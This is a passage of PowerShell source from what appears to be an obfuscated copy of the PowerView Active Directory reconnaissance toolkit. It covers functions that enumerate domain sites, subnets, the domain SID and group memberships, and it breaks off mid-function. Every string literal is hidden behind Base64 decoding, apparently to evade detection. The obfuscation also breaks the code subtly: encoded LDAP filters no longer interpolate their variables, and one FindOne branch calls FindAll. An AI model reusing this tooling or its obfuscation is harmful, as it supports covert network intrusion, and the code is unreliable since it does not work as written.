        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPS4q")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWlu")))
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                    }
                    catch {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BMaW5r")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBTZWFyY2hpbmcgZm9yIHNpdGVzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eQ==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qJEdQTGluayop")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlcg==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            $SiteSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkkRmlsdGVyKQ==")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBHZXQtRG9tYWluU2l0ZSBmaWx0ZXIgc3RyaW5nOiB7MH0="))) -f $($SiteSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                    
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNpdGU="))))
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0")))
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049U3VibmV0cyxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9u")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPS4q")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                    }
                    catch {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            $SubnetSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c3VibmV0KSRGaWx0ZXIp")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEdldC1Eb21haW5TdWJuZXQgZmlsdGVyIHN0cmluZzogezB9"))) -f $($SubnetSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                    
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlN1Ym5ldA=="))))

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))]) {
                    
                    
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KiRTaXRlTmFtZSo="))))) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KiRTaXRlTmFtZSo=")))) {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQ==")))
    }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))))
    }
    else {
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TSURdIEVycm9yIGV4dHJhY3RpbmcgZG9tYWluIFNJRCBmb3IgJyREb21haW4=")))
    }
}


function Get-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVySWRlbnRpdHk=")))]) {

                if ($SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
                    $OldProperties = $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]
                }

                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $MemberIdentity
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    
                    $ObjectDirectoryEntry.RefreshCache(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dG9rZW5Hcm91cHM="))))

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        
                        if ($GroupSid -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LTMyLS4q")))) {
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $GroupSid
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $False
                            if ($OldProperties) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vw"))))
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                    }
                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
